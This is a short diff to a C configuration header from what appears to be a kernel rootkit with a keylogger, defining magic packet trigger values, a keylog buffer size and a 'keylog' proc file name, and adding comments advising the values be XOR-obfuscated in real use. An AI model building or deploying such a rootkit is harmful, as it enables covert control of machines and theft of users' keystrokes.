@@ -9,6 +9,9 @@
   #define DBG_PRINT(fmt, ...) do {} while (0)
 #endif
 
+// Replace these with your actual values
+// Values should be at least XORed in real usage
+
 // Packet magic payloads - change into random values in real usage
 // Hashes for now 
 #define BINARY_RUNNER_PAYLOAD 0xa5aac5c3    // rootkit_binary_exec
@@ -30,5 +33,6 @@
 
 // Keylogger
 #define MAX_KEYLOG_SIZE 8192 // Make sure it matches config.h in userspace
+#define PROC_FILE "keylog"
 
 #endif // CONFIG_H
